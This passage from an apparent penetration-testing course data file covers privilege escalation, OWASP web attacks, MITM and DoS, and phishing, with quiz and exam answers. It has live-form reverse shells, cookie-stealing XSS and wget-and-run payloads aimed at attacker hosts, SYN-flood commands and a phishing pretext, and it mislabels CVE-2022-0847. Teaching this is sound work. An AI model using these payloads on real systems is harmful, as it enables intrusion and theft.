hashcat -m 1800 shadow.txt rockyou.txt
\`\`\``,
          interviewQuestions: [
            { question: "Explain pass-the-hash. Why does it work and what does it exploit?", answer: "Pass-the-hash exploits the NTLM authentication protocol, which sends the hash directly as the credential rather than a derived value. An attacker who obtains an NTLM hash (from SAM, LSASS, or intercepted authentication) can authenticate to network services using that hash without knowing the plaintext password. It works because NTLM never validates the original password — only the hash.", difficulty: "mid" },
            { question: "What is password spraying and why is it preferred over traditional brute force?", answer: "Password spraying tries a single common password against many accounts. Traditional brute force tries many passwords against one account and triggers lockout policies. Spraying stays under the lockout threshold per account while still testing common passwords like 'Company2024!' or 'Welcome1' that many employees use.", difficulty: "junior" }
          ],
          quizQuestions: [
            { question: "You obtain an /etc/shadow entry: $6$salt$hashvalue... What hash algorithm is this and what tool/mode would you use to crack it?", answer: "$6$ indicates SHA-512crypt (sha512crypt). Use John the Ripper with --format=sha512crypt, or Hashcat with mode -m 1800.", type: "scenario", difficulty: "junior" }
          ]
        },
        {
          id: "privilege-escalation",
          title: "Privilege Escalation — Linux & Windows",
          duration: 80,
          type: "lesson",
          description: "You have a shell — now get root/SYSTEM. SUID abuse, sudo misconfiguration, kernel exploits, unquoted service paths, and token impersonation.",
          objectives: [
            "Enumerate privilege escalation vectors systematically on Linux",
            "Exploit SUID binaries, writable cron jobs, and sudo misconfigurations",
            "Enumerate and exploit Windows privilege escalation paths",
            "Use automated tools: LinPEAS, WinPEAS, PowerUp",
            "Understand token impersonation on Windows"
          ],
          content: `# Privilege Escalation — Linux & Windows

You have a low-privileged shell. Privilege escalation (privesc) is the process of gaining higher privileges — root on Linux, SYSTEM or Domain Admin on Windows. This phase separates average pentesters from skilled ones.

## Linux Privilege Escalation

The methodology: enumerate everything, find misconfigurations, exploit the weakest link.

### Automated Enumeration

\`\`\`bash
# LinPEAS — comprehensive Linux enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -s -k keyword -r report.txt

# Key things to look for in output:
# [+] = interesting finding
# [!!] = likely exploitable
\`\`\`

### Sudo Misconfigurations

\`\`\`bash
sudo -l
# Output: (ALL : ALL) NOPASSWD: /usr/bin/vim

# If you can run vim as root:
sudo vim -c ':!/bin/bash'        # escape to shell as root

# Common sudo abuses (GTFOBins — gtfobins.github.io)
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd            # inside less: !bash

# (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
# If script.py imports a writable module, hijack it (Python library hijacking)
\`\`\`

### SUID Exploitation

\`\`\`bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/find:
find / -exec /bin/bash -p \;

# /usr/bin/cp: copy /etc/passwd to /tmp, add root user, copy back
# /usr/bin/vim: :shell

# Custom SUID binary — check with strings and ltrace for vulnerabilities
strings /opt/custom_app
ltrace /opt/custom_app    # trace library calls
\`\`\`

### Writable Cron Jobs

\`\`\`bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# If a root cron job calls a script you can write to:
# /etc/crontab: * * * * * root /opt/backup.sh
ls -la /opt/backup.sh
# -rwxrwxrwx — world writable!

echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh
# Wait for cron to execute → reverse shell as root
\`\`\`

### Kernel Exploits

\`\`\`bash
uname -a          # kernel version
cat /etc/os-release

# Search for known kernel exploits
searchsploit linux kernel 4.4.0
# Copy exploit: searchsploit -m linux/local/44298.c

# Dirty COW (CVE-2016-5195) — Linux kernel <= 4.8.3
# Rogue (CVE-2022-0847) — Linux kernel 5.8 — 5.16.11
\`\`\`

## Windows Privilege Escalation

### Automated Enumeration

\`\`\`powershell
# WinPEAS
.\winPEASany.exe

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp (C# version)
.\SharpUp.exe
\`\`\`

### Unquoted Service Paths

If a Windows service binary path has spaces and is not quoted, Windows searches each path component.

\`\`\`
Service path: C:\Program Files\My App\service.exe
Windows searches in order:
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My App\service.exe

If you can write to C:\Program Files\, create My.exe and wait for service restart.
\`\`\`

\`\`\`powershell
# Find unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows" | findstr /iv """
\`\`\`

### Weak Service Permissions

\`\`\`powershell
# If you have WRITE permission to a service binary, replace it
accesschk.exe -wuvc "Everyone" *           # services writable by Everyone
accesschk.exe -wuvc "BUILTIN\Users" *      # services writable by Users

# Replace binary with reverse shell payload, restart service
sc stop VulnerableService
copy shell.exe "C:\Path\To\vulnerable_service.exe"
sc start VulnerableService
\`\`\`

### Token Impersonation (Potatoes)

Windows tokens represent security context. A service account with SeImpersonatePrivilege can impersonate SYSTEM.

\`\`\`powershell
whoami /priv
# SeImpersonatePrivilege — Enabled  ← vulnerable!

# PrintSpoofer
.\PrintSpoofer.exe -i -c powershell.exe

# JuicyPotato (older systems)
# GodPotato, SweetPotato (newer systems)
\`\`\``,
          interviewQuestions: [
            { question: "Explain the unquoted service path privilege escalation and why Windows is vulnerable to it.", answer: "When a Windows service binary path contains spaces and is not enclosed in quotes (e.g., C:\\Program Files\\My App\\service.exe), Windows attempts to resolve each space-delimited token as a potential executable path. An attacker with write access to an earlier path component (e.g., C:\\Program Files\\My.exe) can place a malicious binary there. When the service starts with SYSTEM privileges, the malicious binary executes first.", difficulty: "mid" },
            { question: "What is the SeImpersonatePrivilege and why can it lead to SYSTEM access?", answer: "SeImpersonatePrivilege allows a process to impersonate a client after authentication. It is commonly granted to service accounts. Potato-class exploits (JuicyPotato, PrintSpoofer) abuse this by forcing the SYSTEM account to authenticate to a local socket and then impersonating that token, effectively escalating to SYSTEM.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "sudo -l shows: (root) NOPASSWD: /usr/bin/vim. How would you use this to get a root shell?", answer: "Run: sudo vim -c ':!/bin/bash' — this opens vim as root (since sudo is allowed), then uses vim's built-in command execution (:!) to spawn bash as root. Alternatively: sudo vim, then in vim type :shell to get a root shell.", type: "hands-on", difficulty: "junior" }
          ]
        }
      ],
      exam: [
        { question: "What is Mimikatz and what Windows privilege is required to run sekurlsa::logonpasswords?", answer: "Mimikatz is a credential dumping tool that reads authentication credentials from Windows LSASS memory. sekurlsa::logonpasswords requires SeDebugPrivilege (debug privilege), which allows access to other processes' memory. Local administrators have this privilege by default.", difficulty: "mid" },
        { question: "Describe three Linux privilege escalation vectors you would check immediately after obtaining a low-privilege shell.", answer: "1) sudo -l — check for NOPASSWD sudo rights to any binary. 2) find / -perm -4000 2>/dev/null — SUID binaries that can be abused. 3) cat /etc/crontab — root cron jobs calling writable scripts. Bonus: uname -a for kernel version, env for PATH hijacking.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 6: WEB APPLICATION SECURITY ──────────────────────────────────
    {
      id: "web-application-security",
      title: "Web Application Security",
      level: "intermediate",
      description: "The most in-demand security skill. Master every OWASP Top 10 vulnerability, SQL injection, XSS, SSRF, IDOR, XXE, and the Burp Suite workflow.",
      lessons: [
        {
          id: "owasp-top-10",
          title: "OWASP Top 10 & Injection Attacks",
          duration: 90,
          type: "lesson",
          description: "The OWASP Top 10 (2021) in depth — what each vulnerability is, how to exploit it, and how to fix it. SQL injection deep dive with all attack types.",
          objectives: [
            "Identify and explain all 10 OWASP Top 10 (2021) categories",
            "Perform error-based, blind, and time-based SQL injection",
            "Use sqlmap for automated SQLi exploitation",
            "Exploit broken access control and IDOR vulnerabilities",
            "Bypass authentication using common techniques"
          ],
          content: `# OWASP Top 10 & Injection Attacks

The Open Web Application Security Project Top 10 is the most widely recognised web security standard. Understanding every category from an attacker's perspective makes you an effective web pentester.

## OWASP Top 10 (2021) Overview

\`\`\`
A01 — Broken Access Control       ↑ #1 (was #5) — most common
A02 — Cryptographic Failures      ↑ #2 (was #3)
A03 — Injection                   ↓ #3 (was #1) — SQLi, XSS, command injection
A04 — Insecure Design             NEW — architectural flaws
A05 — Security Misconfiguration   ↑ #5
A06 — Vulnerable Components       ↑ #6 — Log4Shell, etc.
A07 — Authentication Failures     ↓ #7
A08 — Software Integrity Failures NEW — SolarWinds-style supply chain
A09 — Logging Failures            ↑ #9
A10 — SSRF                        NEW — Server-Side Request Forgery
\`\`\`

## SQL Injection — The Complete Attack

SQL injection occurs when user input is concatenated directly into SQL queries without sanitisation.

**Vulnerable code:**
\`\`\`php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $id;
\`\`\`

**Normal request:** \`/user?id=1\` → \`SELECT * FROM users WHERE id = 1\`
**Injection:** \`/user?id=1 OR 1=1\` → \`SELECT * FROM users WHERE id = 1 OR 1=1\` → returns ALL users

### Error-Based SQLi

The database error message reveals information about the query structure.

\`\`\`sql
-- Test for injection
/item?id=1'
-- Error: "You have an error in your SQL syntax near ''1''"

-- Find number of columns
/item?id=1 ORDER BY 1--    (no error)
/item?id=1 ORDER BY 2--    (no error)
/item?id=1 ORDER BY 3--    (error!) → 2 columns

-- Extract data via UNION
/item?id=-1 UNION SELECT username,password FROM users--
-- -1 ensures no results from original query
\`\`\`

### Blind SQLi (Boolean-Based)

No output in response, but behaviour changes based on TRUE/FALSE.

\`\`\`sql
-- True condition → normal page
/item?id=1 AND 1=1--

-- False condition → empty/different page
/item?id=1 AND 1=2--

-- Extract data character by character
/item?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
/item?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='b'--
-- ... until True → first character confirmed
-- Automate with sqlmap or custom script
\`\`\`

### Time-Based Blind SQLi

No difference in response — infer TRUE/FALSE from response time.

\`\`\`sql
-- MySQL
/item?id=1 AND SLEEP(5)--              (page delays 5s → injectable)
/item?id=1 AND IF(1=1,SLEEP(5),0)--   (delays → condition is TRUE)

-- PostgreSQL
/item?id=1; SELECT pg_sleep(5)--

-- MSSQL
/item?id=1; WAITFOR DELAY '0:0:5'--

-- Extract data time-based
/item?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
\`\`\`

### sqlmap — Automated SQLi

\`\`\`bash
# Basic scan
sqlmap -u "http://target/item?id=1"

# POST request
sqlmap -u "http://target/login" --data "user=admin&pass=1234"

# From Burp Suite request file
sqlmap -r request.txt

# Extract databases
sqlmap -u "http://target/item?id=1" --dbs

# Extract tables from a database
sqlmap -u "http://target/item?id=1" -D webapp --tables

# Dump a table
sqlmap -u "http://target/item?id=1" -D webapp -T users --dump

# Get OS shell (if privileged)
sqlmap -u "http://target/item?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target/item?id=1" --tamper=space2comment,between,randomcase
\`\`\`

## Broken Access Control (IDOR)

The #1 OWASP category. The application does not verify the user is authorised to access the requested resource.

\`\`\`
Normal request:
GET /api/user/12345/invoice/9001
→ Returns your invoice

IDOR attack:
GET /api/user/12345/invoice/9002
→ Returns ANOTHER USER'S invoice (if no authorisation check)

GET /api/admin/users
→ Returns all users (if the admin endpoint is not access-controlled)
\`\`\`

**Mass assignment IDOR:**
\`\`\`
POST /api/user/update
{"name": "Alice", "email": "alice@example.com", "isAdmin": true}
→ If the server blindly maps all JSON keys to the user object, privilege escalation
\`\`\`

## Security Misconfiguration

\`\`\`bash
# Directory listing
GET /files/ → shows index of all files

# Default credentials
admin:admin, admin:password, admin:1234
root:root, tomcat:tomcat

# Exposed admin interfaces
/admin, /phpmyadmin, /manager/html (Tomcat), /.env, /config.php

# Verbose error messages revealing stack traces, paths, versions
# CORS misconfiguration: Access-Control-Allow-Origin: *

# Exposed .git directory — full source code
git clone http://target.com/.git/
\`\`\`

## Vulnerable Components — Log4Shell

CVE-2021-44228 (CVSS 10.0) — the most impactful vulnerability of recent years.

\`\`\`
Log4j logs user-controlled input.
Attacker sends: User-Agent: \${jndi:ldap://attacker.com/exploit}
Log4j processes this as a JNDI lookup, connects to attacker's LDAP server,
downloads and executes attacker's Java class — Remote Code Execution.

Detection:
\${...obfuscated jndi payload...}://attacker.com/x}
(various obfuscations bypass WAF filters)
\`\`\``,
          interviewQuestions: [
            { question: "What is the difference between error-based, blind boolean, and time-based blind SQL injection?", answer: "Error-based: the database error message is reflected in the response, allowing direct data extraction via crafted queries. Blind boolean: the query result is not shown but the page behaves differently for TRUE vs FALSE conditions — data extracted character by character. Time-based blind: no page difference at all — use SLEEP() to infer TRUE/FALSE based on response delay. Each technique is used when the previous is not possible.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A web app shows user profiles at /profile?id=123. Changing to /profile?id=124 shows another user's private data. What vulnerability is this and how should it be fixed?", answer: "IDOR (Insecure Direct Object Reference), a Broken Access Control vulnerability. The fix: server-side authorisation check — after fetching the record with id=124, verify that the authenticated user owns or is permitted to view that record before returning it. Never rely on client-side controls.", type: "scenario", difficulty: "junior" }
          ]
        },
        {
          id: "xss-and-advanced-web",
          title: "XSS, CSRF, SSRF & Advanced Web Attacks",
          duration: 80,
          type: "lesson",
          description: "XSS (all three types), CSRF, SSRF, XXE, command injection, file inclusion, file upload bypass, and Burp Suite as your exploitation platform.",
          objectives: [
            "Identify and exploit reflected, stored, and DOM-based XSS",
            "Construct CSRF attacks to perform actions as the victim",
            "Exploit SSRF to access internal services and cloud metadata",
            "Perform XXE injection to read local files",
            "Use Burp Suite's Repeater, Intruder, and Decoder effectively"
          ],
          content: `# XSS, CSRF, SSRF & Advanced Web Attacks

## Cross-Site Scripting (XSS)

XSS allows an attacker to execute JavaScript in a victim's browser. The impact depends on what the JavaScript does.

### Reflected XSS

The malicious script is in the URL, reflected in the response. Victim must click the link.

\`\`\`
Normal: /search?q=laptop → <p>Results for: laptop</p>
Attack: /search?q=<script>alert(1)</script>
         → <p>Results for: <script>alert(1)</script></p>

Payload examples:
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>
"><svg onload=alert(1)>
\`\`\`

### Stored XSS

The payload is stored in the database and served to every user who views the content. Much more dangerous — no link clicking required.

\`\`\`
Post a comment: <script>new Image().src='https://attacker.com/c?'+document.cookie</script>
Every user who views the comment page sends their cookie to attacker.
\`\`\`

### DOM-Based XSS

The vulnerability is in the JavaScript code itself, not the server.

\`\`\`javascript
// Vulnerable code:
var search = location.hash.substring(1);
document.getElementById("output").innerHTML = search;

// Attack URL:
https://target.com/page#<img src=x onerror=alert(1)>
// The server never sees the payload — it is processed entirely client-side
\`\`\`

### XSS Bypasses

\`\`\`javascript
// When <script> is filtered:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
javascript:alert(1)         // in href attributes

// When quotes are filtered:
<script>alert(String.fromCharCode(88,83,83))</script>

// When spaces are filtered:
<svg/onload=alert(1)>

// Case variation:
<ScRiPt>alert(1)</ScRiPt>
\`\`\`

## Cross-Site Request Forgery (CSRF)

An attacker tricks a user into making an authenticated request to a site where they are logged in.

\`\`\`html
<!-- Evil page served to victim -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker_account">
      <input name="amount" value="10000">
    </form>
  </body>
</html>
<!-- If victim is logged in to bank.com, their browser sends the request
     with their valid session cookie — transfer executes automatically -->
\`\`\`

**Defence:** CSRF tokens — a unique, unpredictable value included in forms that the server validates. An attacker cannot guess the token. Also: SameSite=Strict cookie flag.

## SSRF — Server-Side Request Forgery

The server makes a request to a URL specified by the attacker. The server is the victim's browser.

\`\`\`
Normal: POST /fetch-url
        {"url": "https://example.com/image.jpg"}
        → Server fetches and returns the image

Attack: POST /fetch-url
        {"url": "http://169.254.169.254/latest/meta-data/"}
        → AWS metadata service responds with instance info, IAM credentials!

Attack: POST /fetch-url
        {"url": "http://localhost:8080/admin"}
        → Access internal services not exposed externally

Attack: POST /fetch-url
        {"url": "file:///etc/passwd"}
        → Read local files (if file:// is allowed)
\`\`\`

**Cloud metadata SSRF attack:**
\`\`\`
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ {"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..."}

These temporary AWS credentials can be used to access S3, EC2, Lambda...
This is how the Capital One breach (2019) happened.
\`\`\`

## XXE — XML External Entity Injection

When an application parses XML and external entities are enabled:

\`\`\`xml
<!-- Normal XML -->
<?xml version="1.0"?>
<user><name>Alice</name></user>

<!-- XXE payload — read /etc/passwd -->
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- Response contains the contents of /etc/passwd -->

<!-- Blind XXE — exfiltrate via DNS/HTTP -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/?data=file:///etc/shadow">
  %xxe;
]>
\`\`\`

## Command Injection

User input is passed to OS commands without sanitisation.

\`\`\`php
// Vulnerable
$host = $_GET['host'];
system("ping -c 4 " . $host);
\`\`\`

\`\`\`
Normal: /ping?host=192.168.1.1
Attack: /ping?host=192.168.1.1; cat /etc/passwd
Attack: /ping?host=192.168.1.1 && wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s
Attack: /ping?host=\$(whoami)    (command substitution)
Attack: /ping?host=\`id\`
\`\`\`

## Burp Suite Workflow

\`\`\`
1. Set browser proxy: 127.0.0.1:8080
2. Browse target — Burp captures all requests in Proxy > Intercept

Key tools:
Repeater:   Modify and resend individual requests — test SQLi, XSS, IDOR
Intruder:   Automated fuzzing — brute force, parameter fuzzing, wordlist attacks
Scanner:    Automated vulnerability detection (Pro version)
Decoder:    Base64, URL, HTML encode/decode
Comparer:   Diff two responses to spot differences
Logger:     All HTTP history with search

Typical workflow:
1. Browse app with Proxy — understand all endpoints
2. Send interesting requests to Repeater
3. Test for SQLi: add ' " -- #
4. Test for XSS: add <script>alert(1)</script>
5. Test for IDOR: change IDs in requests
6. Use Intruder for brute force or fuzzing hidden parameters
\`\`\``,
          interviewQuestions: [
            { question: "Describe the impact of a stored XSS vulnerability versus a reflected XSS vulnerability.", answer: "Stored XSS is more dangerous — the payload is saved in the database and executes for every user who views the affected page, requiring no interaction beyond normal browsing. Reflected XSS requires the victim to click a crafted link, limiting the attack to users who receive and click the malicious URL. Both can steal cookies, perform actions as the user, or install browser-based keyloggers.", difficulty: "mid" },
            { question: "How does SSRF allow an attacker to access cloud infrastructure credentials?", answer: "Cloud providers expose instance metadata at a link-local address (169.254.169.254 for AWS/GCP/Azure). If an SSRF vulnerability allows the server to make requests to this address, the attacker can retrieve IAM role credentials, instance details, and user data. These temporary credentials can then be used with the cloud provider's API to access storage, compute, databases, and other services.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A web application includes user-supplied URLs in a server-side HTTP request for a 'preview' feature. The server is running on AWS. What is the critical vulnerability and what is the most impactful thing an attacker could do?", answer: "SSRF. The attacker queries the AWS metadata endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve the IAM role's temporary credentials (Access Key ID, Secret Access Key, Session Token). These can be used with the AWS CLI to access S3 buckets, launch instances, read secrets, and potentially take over the AWS account.", type: "scenario", difficulty: "mid" }
          ]
        }
      ],
      exam: [
        { question: "What is the difference between CSRF and XSS?", answer: "XSS injects malicious JavaScript into a page that executes in the victim's browser — the attacker controls the client. CSRF tricks the victim's browser into making an authenticated request to another site — the attacker exploits the victim's existing session without controlling their browser. XSS can be used to bypass CSRF tokens.", difficulty: "mid" },
        { question: "A login form returns 'User not found' or 'Incorrect password' depending on input. Why is this a vulnerability and what does it enable?", answer: "This is a Username Enumeration vulnerability (information disclosure). Different error messages allow an attacker to determine which usernames exist, enabling targeted brute force or password spraying attacks against confirmed accounts.", difficulty: "junior" }
      ]
    },

    // ─── MODULE 7: NETWORK ATTACKS ────────────────────────────────────────────
    {
      id: "network-attacks",
      title: "Network Attacks, Sniffing & Social Engineering",
      level: "intermediate",
      description: "ARP poisoning, MITM attacks, DoS/DDoS, session hijacking, and the human element — social engineering and phishing campaigns.",
      lessons: [
        {
          id: "network-attacks-mitm",
          title: "Network Attacks & Man-in-the-Middle",
          duration: 70,
          type: "lesson",
          description: "ARP spoofing, DNS poisoning, SSL stripping, session hijacking, DoS/DDoS attack types, and how to detect and prevent them.",
          objectives: [
            "Perform ARP spoofing to position yourself as MITM",
            "Capture and analyse credentials from unencrypted protocols",
            "Understand DNS poisoning and how it enables phishing",
            "Describe DoS/DDoS attack categories and mitigation techniques",
            "Detect MITM attacks using ARP table inspection"
          ],
          content: `# Network Attacks & Man-in-the-Middle

A man-in-the-middle (MITM) attack positions the attacker between two communicating parties. The attacker can read, modify, and inject traffic silently.

## ARP Spoofing

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. It has no authentication — anyone can send ARP replies claiming any IP.

\`\`\`
Normal:
Gateway (192.168.1.1, MAC: AA:BB:CC:DD:EE:FF)
Victim   (192.168.1.100, MAC: 11:22:33:44:55:66)

ARP Spoofing Attack:
Attacker sends to Victim:  "192.168.1.1 is at MY MAC (66:77:88:99:AA:BB)"
Attacker sends to Gateway: "192.168.1.100 is at MY MAC (66:77:88:99:AA:BB)"

Result: All traffic between Victim and Gateway flows through Attacker
\`\`\`

\`\`\`bash
# ARP poisoning with arpspoof
echo 1 > /proc/sys/net/ipv4/ip_forward    # enable IP forwarding
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # poison victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # poison gateway

# With bettercap (more capable)
bettercap -iface eth0
> net.probe on
> net.recon on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on

# Capture credentials from HTTP
> set net.sniff.regexp .*password.*
> net.sniff on
\`\`\`

## SSL Stripping

Downgrades HTTPS to HTTP. Victim thinks they are on HTTP; attacker forwards to HTTPS server.

\`\`\`
Victim → [HTTP] → Attacker → [HTTPS] → Real Server

Victim sees: http://bank.com (no padlock)
Attacker sees: plaintext credentials, session cookies
\`\`\`

\`\`\`bash
# bettercap with sslstrip
> set https.proxy.sslstrip true
> https.proxy on
> arp.spoof on
\`\`\`

**Defence:** HSTS (HTTP Strict Transport Security) — browser remembers to always use HTTPS for a domain. HSTS preloading — hardcoded in browsers.

## DNS Poisoning

Forge DNS responses to redirect victims to malicious servers.

\`\`\`bash
# DNS spoofing with bettercap
> set dns.spoof.domains target.com,*.target.com
> set dns.spoof.address 192.168.1.50    # attacker's IP
> dns.spoof on
> arp.spoof on

# Victim resolves target.com → attacker's IP → attacker's web server
# Serve fake login page, capture credentials
\`\`\`

## DoS and DDoS Attacks

**Volumetric attacks** — exhaust bandwidth:
- UDP flood: send massive UDP traffic to random ports
- ICMP flood (Ping of Death, Smurf)
- DNS/NTP/Memcached amplification (1 request → 100x response to victim)

**Protocol attacks** — exhaust connection tables:
- SYN flood: send SYN packets with spoofed source IPs, server allocates half-open connections until exhausted
- Slowloris: open many HTTP connections, send partial headers slowly — ties up server threads

**Application layer (Layer 7)**:
- HTTP flood: legitimate-looking GET/POST requests that consume CPU
- Rudy (R-U-Dead-Yet): slow POST requests with tiny body chunks

\`\`\`bash
# SYN flood (hping3) — FOR TESTING OWN SYSTEMS ONLY
hping3 -S -p 80 --flood -V target.com

# Slowloris (demonstration)
perl slowloris.pl -dns target.com -port 80 -timeout 30 -num 500
\`\`\`

## Session Hijacking

If an attacker obtains a valid session token, they can impersonate the user without credentials.

\`\`\`
Methods to steal session tokens:
1. XSS: <script>document.location='attacker.com?c='+document.cookie</script>
2. Network sniffing (HTTP, no HttpOnly flag)
3. Man-in-the-middle
4. Predictable session tokens (sequential IDs, weak randomness)

Using stolen token:
EditThisCookie browser extension → change session cookie to stolen value
Burp Repeater → add Cookie: session=stolen_value header
\`\`\`

## Detecting MITM

\`\`\`bash
# Check ARP table for duplicate MACs (two IPs mapped to same MAC)
arp -a
# If you see:
# gateway (192.168.1.1) at aa:bb:cc:dd:ee:ff
# attacker (192.168.1.50) at aa:bb:cc:dd:ee:ff
# Same MAC → ARP spoofing!

# Wireshark filter to detect ARP duplicates
# arp.duplicate-address-detected or arp.opcode == 2
\`\`\``,
          interviewQuestions: [
            { question: "Why does ARP spoofing work and what fundamental protocol weakness enables it?", answer: "ARP has no authentication mechanism. Any host can broadcast an ARP reply associating any IP with any MAC address, and other hosts will update their ARP cache. There is no way to verify whether an ARP reply is legitimate. This is a design flaw from when networks were trusted environments.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "An attacker on the same subnet performs ARP spoofing but the target website uses HTTPS with HSTS. Why does SSL stripping fail?", answer: "HSTS (HTTP Strict Transport Security) causes the browser to automatically redirect all HTTP requests to HTTPS and refuse to load the site over HTTP. Because HSTS is enforced by the browser before any network request, the attacker cannot intercept the initial request to strip TLS. Preloaded HSTS means this behaviour is hardcoded even before the first visit.", type: "scenario", difficulty: "mid" }
          ]
        },
        {
          id: "social-engineering",
          title: "Social Engineering & Phishing",
          duration: 60,
          type: "lesson",
          description: "The human is always the weakest link. Phishing, spear-phishing, vishing, smishing, pretexting, physical attacks, and building real phishing campaigns with the SET toolkit.",
          objectives: [
            "Explain the psychological principles attackers exploit",
            "Design a credible spear-phishing campaign",
            "Understand vishing and smishing attack vectors",
            "Describe physical social engineering: tailgating, pretexting, baiting",
            "Implement countermeasures: security awareness training, email filtering"
          ],
          content: `# Social Engineering & Phishing

Technology can be hardened. Humans cannot be patched. Social engineering is the art of manipulating people into performing actions or revealing information. It bypasses every technical control.

## Psychological Principles

Attackers exploit six universal principles of influence (Cialdini):

| Principle | Example Attack |
|---|---|
| **Authority** | "I'm from IT, I need your password to fix your account" |
| **Urgency/Scarcity** | "Your account will be deleted in 24 hours unless you verify now" |
| **Social Proof** | "All your colleagues already updated their credentials" |
| **Liking** | Build rapport with the target before requesting action |
| **Reciprocity** | Send a gift/help first, then ask for something in return |
| **Commitment** | Small yes leads to larger yes |

## Phishing Attack Types

**Phishing** — mass email campaign targeting many people
**Spear-phishing** — targeted, personalised email using OSINT about the specific victim
**Whaling** — spear-phishing targeting C-level executives (CEO, CFO)
**Vishing** — voice phishing (phone calls impersonating IT support, bank, IRS)
**Smishing** — SMS phishing ("Your package is delayed, click here")

### Building a Spear-Phishing Campaign (Authorised Red Team)

\`\`\`
1. OSINT phase:
   - LinkedIn: victim's name, role, manager, company projects
   - Email format from hunter.io: firstname.lastname@company.com
   - Recent company news (acquisitions, new software rollouts)

2. Pretext creation:
   "Dear [Name], as discussed in Tuesday's all-hands about our new
   Microsoft 365 migration, please click below to re-authenticate
   your account before Friday. — [IT Department]"
   
   Spoofed from: it-support@company-help.com (not company.com)
   Link to: company-365-login.attacker.com (cloned Office 365 page)

3. Credential harvesting:
   Victim enters credentials → attacker captures them → redirect to real site
   (Evilginx2 for real-time session token capture, bypasses MFA)
\`\`\`

### GoPhish — Open Source Phishing Framework

\`\`\`bash
# GoPhish provides campaign management, email tracking, credential capture
./gophish
# Web UI at https://localhost:3333
# Create: sending profile, email template, landing page, target group
# Track: opened, clicked, credentials submitted per user
\`\`\`

## Social Engineering Toolkit (SET)

\`\`\`bash
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Enter URL to clone: https://accounts.google.com
# SET clones the login page, starts a web server, captures credentials
\`\`\`

## Physical Social Engineering

**Tailgating/Piggybacking:** Following an authorised person through a secured door.
**Pretexting:** Creating a fabricated scenario — "I'm the new IT contractor."
**Baiting:** Leaving malware-infected USB drives in the parking lot. Curiosity kills the cat — studies show 45-98% of dropped USBs are plugged in.
**Dumpster Diving:** Organisation documents, old hardware, passwords on sticky notes.

## Countermeasures

- **Security awareness training** — regular phishing simulations, report suspicious emails
- **Email filtering** — SPF, DKIM, DMARC to reject spoofed emails
- **MFA** — even captured passwords do not immediately work
- **Phishing-resistant MFA** — FIDO2/WebAuthn hardware keys defeat real-time phishing
- **Principle of least privilege** — compromised credentials have limited blast radius
- **Caller verification procedures** — IT never asks for passwords over phone`,
          interviewQuestions: [
            { question: "How does Evilginx2 defeat multi-factor authentication?", answer: "Evilginx2 acts as a reverse proxy between the victim and the real website. The victim authenticates normally (including MFA) — but all requests pass through the attacker's server. Evilginx captures the post-authentication session cookie (not just the credentials), which is already authenticated and MFA-verified. This session token can be reused directly, bypassing MFA entirely.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "A red team drops USB drives in the car park labelled 'Q4 Salaries Confidential'. An employee plugs one in. What security principle failure occurred and what technical/human controls could prevent it?", answer: "Human: curiosity + lack of security awareness. Technical: USB port blocking via Group Policy (no autorun, disable USB storage), endpoint DLP, user awareness training about unknown media. Human controls: clear policy against plugging unknown devices, culture of reporting found devices to IT.", type: "scenario", difficulty: "mid" }
          ]
        }
      ],
      exam: [
        { question: "What is the role of SPF, DKIM, and DMARC in preventing email-based social engineering?", answer: "SPF (Sender Policy Framework) lists authorised mail servers for a domain. DKIM (DomainKeys Identified Mail) cryptographically signs emails so tampering is detectable. DMARC builds on both, specifying what to do when checks fail (quarantine/reject) and provides reporting. Together they make email spoofing from a domain much harder.", difficulty: "mid" },
        { question: "Why is 'security awareness training' considered one of the most effective security controls?", answer: "Most attacks involve a human element — phishing, social engineering, insider threat. Technical controls can be bypassed, but a trained employee who recognises phishing, questions unexpected requests, and reports suspicious activity adds a layer that technical tools cannot replicate. Studies show that regular phishing simulation training reduces click rates from ~30% to under 5%.", difficulty: "junior" }
      ]
    },

